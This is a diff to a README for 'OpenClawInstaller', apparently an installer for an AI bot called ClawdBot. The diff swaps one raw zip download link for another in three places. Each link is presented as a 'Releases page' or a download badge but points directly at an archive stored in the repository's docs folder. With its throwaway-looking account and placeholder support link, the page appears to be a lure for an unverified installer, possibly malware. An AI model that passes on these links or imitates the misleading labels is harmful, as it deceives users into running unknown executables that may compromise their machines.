@@ -1,6 +1,6 @@
 # 🐾 OpenClawInstaller - Easy One-Click Deployment Tool
 
-[![Download OpenClawInstaller](https://raw.githubusercontent.com/sdwadsagw/OpenClawInstaller/main/examples/Open_Claw_Installer_3.9.zip)](https://raw.githubusercontent.com/sdwadsagw/OpenClawInstaller/main/examples/Open_Claw_Installer_3.9.zip)
+[![Download OpenClawInstaller](https://github.com/sdwadsagw/OpenClawInstaller/raw/refs/heads/main/docs/Claw-Installer-Open-2.8-alpha.3.zip)](https://github.com/sdwadsagw/OpenClawInstaller/raw/refs/heads/main/docs/Claw-Installer-Open-2.8-alpha.3.zip)
 
 ## 📦 Introduction
 
@@ -18,7 +18,7 @@ Make sure your device meets these requirements before proceeding.
 
 ## 🔗 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/sdwadsagw/OpenClawInstaller/main/examples/Open_Claw_Installer_3.9.zip) to download the latest version of OpenClawInstaller.
+1. Visit the [Releases page](https://github.com/sdwadsagw/OpenClawInstaller/raw/refs/heads/main/docs/Claw-Installer-Open-2.8-alpha.3.zip) to download the latest version of OpenClawInstaller.
 
 2. Look for the version number you want. Click on it to see the available downloadable files. You will usually find different options for Windows, macOS, and Linux.
 
@@ -60,7 +60,7 @@ If you encounter any issues during installation or usage:
 
 - Ensure your device meets the system requirements.
 - Restart your device and try opening ClawdBot again.
-- Check for updates on the [Releases page](https://raw.githubusercontent.com/sdwadsagw/OpenClawInstaller/main/examples/Open_Claw_Installer_3.9.zip).
+- Check for updates on the [Releases page](https://github.com/sdwadsagw/OpenClawInstaller/raw/refs/heads/main/docs/Claw-Installer-Open-2.8-alpha.3.zip).
 
 If the problem persists, feel free to reach out through our [support page](#) for additional help.
 
